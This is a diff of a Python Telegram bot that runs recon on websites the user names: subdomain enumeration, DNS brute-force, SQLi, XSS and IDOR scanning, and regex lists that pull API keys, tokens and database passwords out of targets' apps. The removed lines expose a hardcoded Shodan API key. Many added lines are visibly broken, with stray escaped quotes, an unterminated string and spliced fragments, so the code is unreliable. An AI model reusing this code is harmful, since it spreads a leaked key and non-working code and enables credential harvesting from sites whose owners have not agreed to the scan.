-                            results.setdefault("jldc", []).append(h)
-                            jldc_count += 1
-            except Exception:
-                pass
-        progress_q.append(f"✅ jldc.me: `{jldc_count}` found")
-    except Exception as e:
-        results["errors"].append(f"jldc: {e}")
-
-    # ── Source 8: Anubis DB ────────────────────────────────
-    progress_q.append("🔍 Querying Anubis subdomain DB...")
-    try:
-        r = requests.get(
-            f"https://jonlu.ca/anubis/subdomains/{domain}",
-            timeout=12, headers={"Accept": "application/json"}
-        )
-        anubis_count = 0
-        if r.status_code == 200:
-            try:
-                entries = r.json()
-                if isinstance(entries, list):
-                    for h in entries:
-                        if isinstance(h, str) and h.endswith(f".{domain}") and h not in found_all:
-                            found_all.add(h)
-                            results.setdefault("anubis", []).append(h)
-                            anubis_count += 1
-            except Exception:
-                pass
-        progress_q.append(f"✅ Anubis: `{anubis_count}` found")
-    except Exception as e:
-        results["errors"].append(f"Anubis: {e}")
-
-    # ── Source 9: Subdomainfinder.c99.nl ──────────────────
-    progress_q.append("🔍 Querying c99.nl subdomain finder...")
-    try:
-        r = requests.get(
-            f"https://subdomainfinder.c99.nl/scans/{domain}",
-            timeout=12, headers={"User-Agent": "Mozilla/5.0", "Accept": "text/html"}
-        )
-        c99_count = 0
-        if r.status_code == 200:
-            for m in re.finditer(r'([a-z0-9][a-z0-9\-\.]*\.' + re.escape(domain) + r')', r.text, re.I):
-                h = m.group(1).strip().lower()
-                if h.endswith(f".{domain}") and h not in found_all:
-                    found_all.add(h)
-                    results.setdefault("c99", []).append(h)
-                    c99_count += 1
-        progress_q.append(f"✅ c99.nl: `{c99_count}` found")
-    except Exception as e:
-        results["errors"].append(f"c99: {e}")
-
-    # ── Source 10: Shodan (passive, no auth needed for subdomains) ──
-    progress_q.append("🔍 Querying Shodan passive DNS...")
-    try:
-        r = requests.get(
-            f"https://api.shodan.io/dns/domain/{domain}?key=PSKINdQe1GyxGgecYz2191H2JoS9qvgD",
-            timeout=12, headers={"Accept": "application/json"}
-        )
-        shodan_count = 0
-        if r.status_code == 200:
-            try:
-                data_sh = r.json()
-                for sub in data_sh.get("subdomains", []):
-                    if isinstance(sub, str) and sub:
-                        h = f"{sub}.{domain}".lower()
-                        if h not in found_all:
-                            found_all.add(h)
-                            results.setdefault("shodan", []).append(h)
-                            shodan_count += 1
-            except Exception:
-                pass
-        progress_q.append(f"✅ Shodan: `{shodan_count}` found")
-    except Exception as e:
-        results["errors"].append(f"Shodan: {e}")
-
     # ── Source 4: DNS Brute-force ────────────────────
     progress_q.append(f"🔍 DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)...")
     live_subs  = []
@@ -7919,11 +7669,11 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
         except socket.gaierror:
             return None
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=60) as ex:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
         futs = {ex.submit(_check_sub, w): w for w in _SUBDOMAIN_WORDLIST}
         done = 0
         try:
-            for fut in concurrent.futures.as_completed(futs, timeout=60):
+            for fut in concurrent.futures.as_completed(futs, timeout=40):
                 done += 1
                 if done % 50 == 0:
                     progress_q.append(f"🔍 Brute-force: `{done}/{len(_SUBDOMAIN_WORDLIST)}` tested | `{len(live_subs)}` live")
@@ -7953,7 +7703,7 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
             resolved[h] = "unresolved"
 
     # ── HTTP live check + page title fetch ──────────  ✅ V23 Enhanced
-    progress_q.append(f"🌐 HTTP live check + title fetch for top `{min(60, len(all_unique))}` subdomains...")
+    progress_q.append(f"🌐 HTTP live check + title fetch for top `{min(20, len(all_unique))}` subdomains...")
     http_status: dict = {}
 
     # ✅ V23: Interesting subdomain keywords to highlight
@@ -7993,8 +7743,8 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
                 continue
         return hostname, None, None, "", False
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
-        http_futs = {ex.submit(_http_check, h): h for h in all_unique[:60]}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+        http_futs = {ex.submit(_http_check, h): h for h in all_unique[:20]}
         try:
             for fut in concurrent.futures.as_completed(http_futs, timeout=30):
                 try:
@@ -9138,9 +8888,9 @@ class BinaryStringExtractor:
         "Slack Token": r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[0-9a-zA-Z]{24,32}",
         "GitHub Token": r"ghp_[0-9a-zA-Z]{36}",
         
-        "MongoDB URI": r"mongodb(\+srv)?://[^\s\"']+(:[^\s\"']+)?@[^\s\"']+",
-        "MySQL Connection": r"mysql://[^\s\"']+(:[^\s\"']+)?@[^\s\"']+",
-        "PostgreSQL": r"postgresql://[^\s\"']+(:[^\s\"']+)?@[^\s\"']+",
+        "MongoDB URI": r"mongodb(\+srv)?://[^\s\"\']+(:[^\s\"\']+)?@[^\s\"\']+",
+        "MySQL Connection": r"mysql://[^\s\"\']+(:[^\s\"\']+)?@[^\s\"\']+",
+        "PostgreSQL": r"postgresql://[^\s\"\']+(:[^\s\"\']+)?@[^\s\"\']+",
         
         "Private Key": r"-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY",
         "JWT Token": r"eyJ[A-Za-z0-9_\-\.]{20,}",
@@ -11501,8 +11251,8 @@ async def _send_admin_panel(target, db: dict):
         f"{'━' * 22}\n"
         f"🤖 Bot: {status_line}\n"
         f"👥 Users: `{tu}` total  |  🚫 Banned: `{banned_n}`\n"
-        f"📦 Downloads: `{tdl}` total  |  Today: `{today_dl}`\n"
-        f"📂 Sensitive Files: `{db.get('stats', {}).get('sensitive_files_found', 0)}` | 🔌 BOLA/IDOR: `{db.get('stats', {}).get('bola_idor_found', 0)}`\n"
+        f"📦 Downloads: `{tdl}` total  |  Today: `{today_dl}`\n"\
+        f"📂 Sensitive Files: `{db.get(\"stats\", {}).get(\"sensitive_files_found\", 0)}` | 🔌 BOLA/IDOR: `{db.get(\"stats\", {}).get(\"bola_idor_found\", 0)}`\n"
         f"🔍 Active scans: `{active_sc}`  |  Queue: `{queue_sz}`\n"
         f"⚡ Workers: `{MAX_WORKERS}`  |  Limit: `{db['settings']['global_daily_limit']}/day`\n"
         f"💾 DB: {db_sz}  |  JS: {'✅' if PUPPETEER_OK else '❌'}"
@@ -11681,32 +11431,32 @@ _APP_EXTS = {
 # ── Regex patterns for API/URL/Key extraction ────
 _APP_URL_PATTERNS = [
     # Full URLs
-    re.compile(r'https?://[^\\s\x27"<>{}\[\]\\|^`]{8,200}'),
+    re.compile(r'https?://[^\s\'"<>{}\[\]\\|^`]{8,200}'),
     # API paths
-    re.compile(r'[\x27"/]((?:api|rest|graphql|v\d+)/[^\\s\x27"<>]{3,120})[\x27"/]'),
+    re.compile(r'[\'"/]((?:api|rest|graphql|v\d+)/[^\s\'"<>]{3,120})[\'"/]'),
     # Base URLs
-    re.compile(r'(?:BASE_URL|baseUrl|base_url|API_URL|apiUrl|HOST|ENDPOINT)\s*[=:]\s*[\x27"]([^\x27"]{8,150})[\x27"]', re.I),
+    re.compile(r'(?:BASE_URL|baseUrl|base_url|API_URL|apiUrl|HOST|ENDPOINT)\s*[=:]\s*[\'"]([^\'"]{8,150})[\'"]', re.I),
     # WebSocket
-    re.compile(r'wss?://[^\\s\x27"<>{}\[\]\\]{8,150}'),
+    re.compile(r'wss?://[^\s\'"<>{}\[\]\\]{8,150}'),
 ]
 
 _APP_SECRET_PATTERNS = {
-    'API Key':        re.compile(r'(?:api[_-]?key|apikey)\s*[=:]\s*[\x27"]([A-Za-z0-9_\-]{16,80})[\x27"]', re.I),
-    'Secret Key':     re.compile(r'(?:secret[_-]?key|client_secret)\s*[=:]\s*[\x27"]([A-Za-z0-9_\-]{16,80})[\x27"]', re.I),
+    'API Key':        re.compile(r'(?:api[_-]?key|apikey)\s*[=:]\s*[\'"]([A-Za-z0-9_\-]{16,80})[\'"]', re.I),
+    'Secret Key':     re.compile(r'(?:secret[_-]?key|client_secret)\s*[=:]\s*[\'"]([A-Za-z0-9_\-]{16,80})[\'"]', re.I),
     'Bearer Token':   re.compile(r'[Bb]earer\s+([A-Za-z0-9\-_\.]{20,200})'),
     'AWS Key':        re.compile(r'AKIA[0-9A-Z]{16}'),
-    'AWS Secret':     re.compile(r'(?:aws_secret|AWS_SECRET)[^\x27"]{0,10}[\x27"]([A-Za-z0-9/+=]{40})[\x27"]', re.I),
+    'AWS Secret':     re.compile(r'(?:aws_secret|AWS_SECRET)[^\'"]{0,10}[\'"]([A-Za-z0-9/+=]{40})[\'"]', re.I),
     'Google API':     re.compile(r'AIza[0-9A-Za-z\-_]{35}'),
     'Firebase URL':   re.compile(r'https://[a-z0-9\-]+\.firebaseio\.com'),
-    'Firebase Key':   re.compile(r'[\x27"]([A-Za-z0-9_\-]{39}):APA91b[A-Za-z0-9_\-]{134}[\x27"]'),
+    'Firebase Key':   re.compile(r'[\'"]([A-Za-z0-9_\-]{39}):APA91b[A-Za-z0-9_\-]{134}[\'"]'),
     'Stripe Key':     re.compile(r'(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}'),
     'Twilio SID':     re.compile(r'AC[0-9a-fA-F]{32}'),
     'Private Key':    re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
     'JWT Token':      re.compile(r'eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}'),
-    'MongoDB URI':    re.compile(r'mongodb(?:\+srv)?://[^\\s\x27"<>]{10,150}'),
-    'MySQL URI':      re.compile(r'mysql://[^\\s\x27"<>]{10,150}'),
-    'Postgres URI':   re.compile(r'postgres(?:ql)?://[^\\s\x27"<>]{10,150}'),
-    'Hardcoded Pass': re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*[\x27"]([^\x27"]{6,60})[\x27"]', re.I),
+    'MongoDB URI':    re.compile(r'mongodb(?:\+srv)?://[^\s\'"<>]{10,150}'),
+    'MySQL URI':      re.compile(r'mysql://[^\s\'"<>]{10,150}'),
+    'Postgres URI':   re.compile(r'postgres(?:ql)?://[^\s\'"<>]{10,150}'),
+    'Hardcoded Pass': re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*[\'"]([^\'"]{6,60})[\'"]', re.I),
 }
 
 # ── File types to scan inside archive ───────────
@@ -11741,7 +11491,7 @@ def _scan_text_content(text: str, source_file: str) -> dict:
 
     for pat in _APP_URL_PATTERNS:
         for m in pat.findall(text):
-            url = m.strip().rstrip('.,;\x27"\\/)')
+            url = m.strip().rstrip('.,;\'"\\/)')
             if len(url) > 8 and not any(noise in url for noise in [
                 'schemas.android', 'xmlns', 'w3.org', 'apache.org',
                 'example.com', 'localhost', 'schema.org',
@@ -11782,23 +11532,23 @@ def _parse_android_manifest(xml_text: str) -> dict:
             "services": [], "receivers": [], "meta_data": {}}
     try:
         # package name
-        m = re.search(r'package=[\x27"]([^\x27"]+)[\x27"]', xml_text)
+        m = re.search(r'package=[\'"]([^\'"]+)[\'"]', xml_text)
         if m: info["package"] = m.group(1)
 
         # permissions
-        for m in re.finditer(r'uses-permission[^>]+android:name=[\x27"]([^\x27"]+)[\x27"]', xml_text):
+        for m in re.finditer(r'uses-permission[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
             info["permissions"].append(m.group(1).replace('android.permission.', ''))
 
         # activities
-        for m in re.finditer(r'activity[^>]+android:name=[\x27"]([^\x27"]+)[\x27"]', xml_text):
+        for m in re.finditer(r'activity[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
             info["activities"].append(m.group(1))
 
         # services
-        for m in re.finditer(r'service[^>]+android:name=[\x27"]([^\x27"]+)[\x27"]', xml_text):
+        for m in re.finditer(r'service[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
             info["services"].append(m.group(1))
 
         # meta-data (API keys often here)
-        for m in re.finditer(r'meta-data[^>]+android:name=[\x27"]([^\x27"]+)[\x27"][^>]+android:value=[\x27"]([^\x27"]+)[\x27"]', xml_text):
+        for m in re.finditer(r'meta-data[^>]+android:name=[\'"]([^\'"]+)[\'"][^>]+android:value=[\'"]([^\'"]+)[\'"]', xml_text):
             info["meta_data"][m.group(1)] = m.group(2)[:80]
 
     except Exception as _e:
@@ -13378,14 +13128,14 @@ def _do_robots_scan_sync(url: str) -> dict:
         crawl_delay = None
         for line in r.text.splitlines():
             line = line.strip()
-            if not line or line.startswith('#'): continue
+            if not line or line.startswith(\'#\'): continue
             if ":" in line:
                 k, _, v = line.partition(":")
                 k = k.strip().lower(); v = v.strip()
-                if k == 'disallow' and v: disallows.append(v)
-                elif k == 'sitemap':      sitemaps.append(v)
-                elif k == 'allow' and v:   allows.append(v) # v46: Extract Allow rules
-                elif k == 'crawl-delay':  crawl_delay = v  # v46: Extract Crawl-delay
+                if k == \'disallow\' and v: disallows.append(v)
+                elif k == \'sitemap\':      sitemaps.append(v)
+                elif k == \'allow\' and v:   allows.append(v) # v46: Extract Allow rules
+                elif k == \'crawl-delay\':  crawl_delay = v  # v46: Extract Crawl-delay
         return {"disallow": disallows, "sitemaps": sitemaps, "allow": allows, "crawl_delay": crawl_delay, "status": 200}
     except Exception as e:
         return {"disallow": [], "sitemaps": [], "error": str(e)}
@@ -13401,15 +13151,15 @@ def _do_links_scan_sync(url: str) -> dict:
         origin = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
         internal, external = [], []
         # v46: Extract links from various tags
-        for tag in soup.find_all(['a', 'link', 'script', 'img'], href=True) + soup.find_all('img', src=True) + soup.find_all('script', src=True):
-            href = tag.get('href') or tag.get('src')
-            if not href or href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
+        for tag in soup.find_all([\'a\', \'link\', \'script\', \'img\'], href=True) + soup.find_all(\'img\', src=True) + soup.find_all(\'script\', src=True):
+            href = tag.get(\'href\') or tag.get(\'src\')
+            if not href or href.startswith((\'#\', \'javascript:\', \'mailto:\', \'tel:\')):
                 continue
             full = urljoin(url, href)
             if full.startswith(origin):
                 if full not in internal: internal.append(full)
             else:
-                if full.startswith('http') and full not in external:
+                if full.startswith(\'http\') and full not in external:
                     external.append(full)
         return {"internal": internal[:100], "external": external[:50]}
     except Exception as e:
@@ -13562,12 +13312,12 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
     if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode=\'Markdown\')
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
             f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ",
-            parse_mode='Markdown')
+            parse_mode=\'Markdown\')
         return
 
     args = context.args or []
@@ -13587,7 +13337,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "  📂 `sensitive` — Sensitive Files (NEW)\n"
             "  🔌 `bola`      — BOLA/IDOR (NEW)\n\n"
             "*Example:* `/recon https://example.com`",
-            parse_mode='Markdown'
+            parse_mode=\'Markdown\'
         )
         return
 
@@ -13733,19 +13483,19 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines = [
         f"🕵️ *Full Recon Report — `{domain}`*",
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-            f"📅 Date: `{datetime.now().strftime('%Y-%m-%d %H:%M')}`",
+        f"📅 Date: `{datetime.now().strftime(\"%Y-%m-%d %H:%M\")}`",
     ]
 
     # v46: Add Sensitive Files and BOLA/IDOR to summary
-    if not isinstance(_results.get('sensitive'), Exception):
-        found_sens = len(_results['sensitive'].get("found", []))
-        lines.append(f"📂 *Sensitive Files:* `{found_sens}` {'🔴 found' if found_sens else '✅ none'}")
+    if not isinstance(_results.get(\'sensitive\'), Exception):
+        found_sens = len(_results[\'sensitive\'].get("found", []))
+        lines.append(f"📂 *Sensitive Files:* `{found_sens}` {\'🔴 found\' if found_sens else \'✅ none\'}")
     else:
         lines.append(f"📂 *Sensitive Files:* ❌ Error")
 
-    if not isinstance(_results.get('bola'), Exception):
-        found_bola = len(_results['bola'].get("found", []))
-        lines.append(f"🔌 *BOLA/IDOR:* `{found_bola}` {'🔴 found' if found_bola else '✅ none'}")
+    if not isinstance(_results.get(\'bola\'), Exception):
+        found_bola = len(_results[\'bola\'].get("found", []))
+        lines.append(f"🔌 *BOLA/IDOR:* `{found_bola}` {\'🔴 found\' if found_bola else \'✅ none\'}")
     else:
         lines.append(f"🔌 *BOLA/IDOR:* ❌ Error")
 
@@ -13861,12 +13611,12 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
     if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode=\'Markdown\')
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
             f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ",
-            parse_mode='Markdown')
+            parse_mode=\'Markdown\')
         return
     _active_scans.set(uid, "Discover")
 
@@ -13887,7 +13637,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "  💉 SQLi Scanner (NEW)\n"
             "  🎭 XSS Scanner (NEW)\n\n"
             "*Example:* `/discover https://example.com`",
-            parse_mode='Markdown'
+            parse_mode=\'Markdown\'
         )
         return
 
@@ -14000,8 +13750,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
         # ── Update module statuses ───────────────────────────────────────not isinstance(api_r, Exception):
-        # ── Update module statuses ───────────────────────────────────────
-        if not isinstance(api_r, Exception):
+            eps = api_r.get("found", []); st = api_r.get("stats", {})
             _mod_done('api', '🔌 API endpoints', f"`{len(eps)}` eps | JSON:`{st.get('json_apis',0)}`")
         else: _mod_error('api', '🔌 API endpoints')
 
@@ -14012,17 +13761,17 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if not isinstance(subs_r, Exception):
             _mod_done('subs', '📡 Subdomains   ', f"`{subs_r.get('total_unique',0)}` unique")
-        else: _mod_error('subs', '📡 Subdomains')
+        else: _mod_error('subs', '📡 Subdomains 
+
         if not isinstance(sqli_r, Exception):
-            sq = sqli_r.get('total_found', 0)
-            _mod_done('sqli', '💉 SQLi         ', f"🔴 `{sq}` vuln" if sq else 'clean')
-        else: _mod_error('sqli', '💉 SQLi         ')
+            sq = sqli_r.get(\'total_found\', 0)
+            _mod_done(\'sqli\', \'💉 SQLi         \', f"🔴 `{sq}` vuln" if sq else \'clean\')
+        else: _mod_error(\'sqli\', \'💉 SQLi         \')
 
         if not isinstance(xss_r, Exception):
-            xx = xss_r.get('total_found', 0)
-            _mod_done('xss', '🎭 XSS          ', f"🔴 `{xx}` vuln" if xx else 'clean')
-        else: _mod_error('xss', '🎭 XSS          ')
-        # Combined summary ──────────────────────────────────────────────
+            xx = xss_r.get(\'total_found\', 0)
+            _mod_done(\'xss\', \'🎭 XSS          \', f"🔴 `{xx}` vuln" if xx else \'clean\')
+        else: _mod_error(\'xss\', \'🎭 XSS          \')bined summary ──────────────────────────────────────────────
         lines = [
             f"🔎 *Full Discovery Report — `{domain}`*",
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
@@ -14147,12 +13896,12 @@ async def _send_sensitive_report(update, context, url: str, result: dict):
     lines = [
         f"📂 *Sensitive Files Report — `{urlparse(url).hostname}`*",
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-        f"Total found: `{len(result['files'])}`\n",
+        f"Total found: `{len(result["files"])}`\n",
         "*Files:*"]
     for f in result["files"]:
         lines.append(f"  - `{f}`")
     
-    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')
+    await update.effective_message.reply_text("\n".join(lines), parse_mode=\'Markdown\')
 
 async def _send_bola_report(update, context, url: str, result: dict):
     if not result.get("issues"):
@@ -14161,12 +13910,12 @@ async def _send_bola_report(update, context, url: str, result: dict):
     lines = [
         f"🔌 *BOLA/IDOR Report — `{urlparse(url).hostname}`*",
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-        f"Total issues: `{len(result['issues'])}`\n",
+        f"Total issues: `{len(result["issues"])}`\n",
         "*Issues:*"]
     for i in result["issues"]:
         lines.append(f"  - `{i}`")
     
-    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')
+    await update.effective_message.reply_text("\n".join(lines), parse_mode=\'Markdown\')
 
 async def _send_api_report(update, context, domain: str, result: dict):
     """Send API discovery JSON report as file."""
@@ -15236,14 +14985,14 @@ _PHP_SQLI_PATTERNS = [
     (re.compile(r'(?i)\$_(GET|POST|REQUEST|COOKIE)\[.*?\].*?(mysql_query|mysqli_query|pg_query|mssql_query|pdo->query|pdo->prepare)\s*\('), '🔴 Direct user input in SQL query'),
     (re.compile(r'(?i)"(?:SELECT|INSERT|UPDATE|DELETE).+?"\s*\.\s*\$_(GET|POST|REQUEST|COOKIE)'), '🔴 SQL string concat with user input'),
     (re.compile(r"(?i)'(?:SELECT|INSERT|UPDATE|DELETE).+?'\s*\.\s*\$_(GET|POST|REQUEST|COOKIE)"), '🔴 SQL string concat with user input'),
-    (re.compile(r'(?i)\$sql\s*=\s*["\x27"](?:SELECT|INSERT|UPDATE|DELETE).*?["\x27"]\s*\.\s*\$'), '🟠 SQL variable concat'),
+    (re.compile(r'(?i)\$sql\s*=\s*["\'](?:SELECT|INSERT|UPDATE|DELETE).*?["\']\s*\.\s*\$'), '🟠 SQL variable concat'),
     (re.compile(r'(?i)sprintf\s*\(.*?(?:SELECT|INSERT|UPDATE|DELETE).*?%[sd].*?\$_(GET|POST|REQUEST|COOKIE)'), '🟠 sprintf SQL injection'),
-    (re.compile(r'(?i)\$pdo->(?:query|exec|prepare)\s*\(\s*["\x27"].*?\$_(GET|POST|REQUEST|COOKIE)'), '🔴 PDO query with direct user input'),
+    (re.compile(r'(?i)\$pdo->(?:query|exec|prepare)\s*\(\s*["\'].*?\$_(GET|POST|REQUEST|COOKIE)'), '🔴 PDO query with direct user input'),
 ]
 
 _PHP_LFI_PATTERNS = [
     (re.compile(r'(?i)(?:include|require|include_once|require_once)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'), '🔴 File inclusion with user input (LFI/RFI)'),
-    (re.compile(r'(?i)(?:include|require|include_once|require_once)\s*\(\s*["\x27"].*?\.\s*\$_(GET|POST)'),   '🔴 Dynamic path file inclusion'),
+    (re.compile(r'(?i)(?:include|require|include_once|require_once)\s*\(\s*["\'].*?\.\s*\$_(GET|POST)'),   '🔴 Dynamic path file inclusion'),
     (re.compile(r'(?i)file_get_contents\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'),                             '🟠 file_get_contents with user input (SSRF/LFI)'),
     (re.compile(r'(?i)readfile\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'),                                     '🟠 readfile with user input'),
     (re.compile(r'(?i)fopen\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'),                                        '🟠 fopen with user input'),
@@ -15268,23 +15017,23 @@ _PYTHON_VULN_PATTERNS = [
     (re.compile(r'\bexec\s*\('),                                  '🔴 exec() — code injection risk'),
     (re.compile(r'\bos\.system\s*\('),                            '🔴 os.system() — command injection'),
     (re.compile(r'\bsubprocess\.(call|run|Popen)\s*\(.*?shell\s*=\s*True'), '🔴 subprocess shell=True — injection risk'),
-    (re.compile(r'(?i)cursor\.execute\s*\(\s*["\x27"].*?%\s*\('),   '🔴 %-formatted SQL (SQLi)'),
-    (re.compile(r'(?i)cursor\.execute\s*\(\s*f["\x27"]'),            '🔴 f-string SQL query (SQLi)'),
+    (re.compile(r'(?i)cursor\.execute\s*\(\s*["\'].*?%\s*\('),   '🔴 %-formatted SQL (SQLi)'),
+    (re.compile(r'(?i)cursor\.execute\s*\(\s*f["\']'),            '🔴 f-string SQL query (SQLi)'),
     (re.compile(r'(?i)render_template_string\s*\(.*?request\.(args|form|json)'), '🔴 SSTI — render_template_string with user input'),
     (re.compile(r'(?i)yaml\.load\s*\([^)]*Loader\s*=\s*None'),   '🟠 yaml.load without SafeLoader (arbitrary code)'),
     (re.compile(r'(?i)pickle\.loads?\s*\('),                      '🟠 pickle.load — arbitrary code on untrusted data'),
     (re.compile(r'(?i)request\.(args|form|json)\[.*?\].*?open\s*\('), '🟠 User input in file open (path traversal)'),
     (re.compile(r'(?i)DEBUG\s*=\s*True'),                         '🟡 Django/Flask DEBUG=True (production leak)'),
-    (re.compile(r'(?i)SECRET_KEY\s*=\s*["\x27"][a-z0-9]{1,20}["\x27"]'), '🟡 Weak/default SECRET_KEY'),
+    (re.compile(r'(?i)SECRET_KEY\s*=\s*["\'][a-z0-9]{1,20}["\']'), '🟡 Weak/default SECRET_KEY'),
 ]
 
 # ── Hardcoded credential patterns ─────────────────────────────────────
 _CRED_PATTERNS = [
-    (re.compile(r'(?i)define\s*\(\s*["\x27"](?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD)["\x27"],\s*["\x27"]([^"\x27]{3,})["\x27"]'), '🔴 Hardcoded DB password (define)'),
-    (re.compile(r'(?i)\$(?:db_?pass(?:word)?|mysql_?pass|pg_?pass)\s*=\s*["\x27"]([^"\x27]{3,})["\x27"]'),   '🔴 Hardcoded DB password variable'),
-    (re.compile(r'(?i)(?:password|passwd|pwd)\s*=\s*["\x27"]([^\\s"\x27]]{8,})["\x27"]'),                        '🟠 Hardcoded password'),
-    (re.compile(r'(?i)(?:secret_key|app_secret|api_secret)\s*=\s*["\x27"]([^"\x27]{8,})["\x27"]'),            '🟠 Hardcoded secret'),
-    (re.compile(r'(?i)(?:admin|root|superuser)\s*[:=]\s*["\x27"]([^"\x27]{3,})["\x27"].*?(?:pass|pwd|secret)'), '🟡 Admin credential pattern'),
+    (re.compile(r'(?i)define\s*\(\s*["\'](?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD)["\'],\s*["\']([^"\']{3,})["\']'), '🔴 Hardcoded DB password (define)'),
+    (re.compile(r'(?i)\$(?:db_?pass(?:word)?|mysql_?pass|pg_?pass)\s*=\s*["\']([^"\']{3,})["\']'),   '🔴 Hardcoded DB password variable'),
+    (re.compile(r'(?i)(?:password|passwd|pwd)\s*=\s*["\']([^\s"\']{8,})["\']'),                        '🟠 Hardcoded password'),
+    (re.compile(r'(?i)(?:secret_key|app_secret|api_secret)\s*=\s*["\']([^"\']{8,})["\']'),            '🟠 Hardcoded secret'),
+    (re.compile(r'(?i)(?:admin|root|superuser)\s*[:=]\s*["\']([^"\']{3,})["\'].*?(?:pass|pwd|secret)'), '🟡 Admin credential pattern'),
 ]
 
 # ── Sensitive file patterns found in downloaded zip ───────────────────
@@ -15315,9 +15064,9 @@ _SENSITIVE_FILES = [
 
 # ── Admin/panel path patterns ──────────────────────────────────────────
 _ADMIN_PATH_PATTERNS = re.compile(
-    r'''["\x27`](/(?:admin|dashboard|panel|manage|control|backend|wp-admin|administrator|'
+    r'''["'`](/(?:admin|dashboard|panel|manage|control|backend|wp-admin|administrator|'
     r'phpmyadmin|cpanel|plesk|webmin|manager|superadmin|root|staff|moderator)'
-    r'[^"\x27`\s]*?)["\x27`]''',
+    r'[^"'`\s]*?)["'`]''',
     re.IGNORECASE
 )
 
@@ -18036,7 +17785,7 @@ _SSTI_EXPLOITATION = [
 # v39 fix: missing _SECRET_REGEX_MAP constant
 _SECRET_REGEX_MAP = {
     "AWS Access Key":        (r'(?:AKIA|AIPA|ASIA|AROA)[0-9A-Z]{16}', "CRITICAL"),
-    "AWS Secret Key":        (r'(?i)aws.{0,20}secret.{0,20}[=:][\s]*[\x27"]?([A-Za-z0-9/+=]{40})', "CRITICAL"),
+    "AWS Secret Key":        (r'(?i)aws.{0,20}secret.{0,20}[=:][\s]*[\'"]?([A-Za-z0-9/+=]{40})', "CRITICAL"),
     "Google API Key":        (r'AIza[0-9A-Za-z\-_]{35}', "HIGH"),
     "Google OAuth":          (r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com', "HIGH"),
     "GitHub Token":          (r'ghp_[0-9A-Za-z]{36}|github_pat_[0-9A-Za-z_]{82}', "CRITICAL"),
@@ -18046,13 +17795,13 @@ _SECRET_REGEX_MAP = {
     "Stripe API Key":        (r'sk_(?:live|test)_[0-9A-Za-z]{24,}', "CRITICAL"),
     "Stripe Publishable Key":(r'pk_(?:live|test)_[0-9A-Za-z]{24,}', "MEDIUM"),
     "Twilio Account SID":    (r'AC[a-zA-Z0-9]{32}', "HIGH"),
-    "Twilio Auth Token":     (r'(?i)twilio.{0,20}[=:][\s]*[\x27"]?([a-zA-Z0-9]{32})', "HIGH"),
+    "Twilio Auth Token":     (r'(?i)twilio.{0,20}[=:][\s]*[\'"]?([a-zA-Z0-9]{32})', "HIGH"),
     "SendGrid API Key":      (r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}', "HIGH"),
     "Mailgun API Key":       (r'key-[0-9a-zA-Z]{32}', "HIGH"),
     "JWT Token":             (r'eyJ[A-Za-z0-9\-_=]+\.eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_.+/=]*', "MEDIUM"),
     "Private Key":           (r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----', "CRITICAL"),
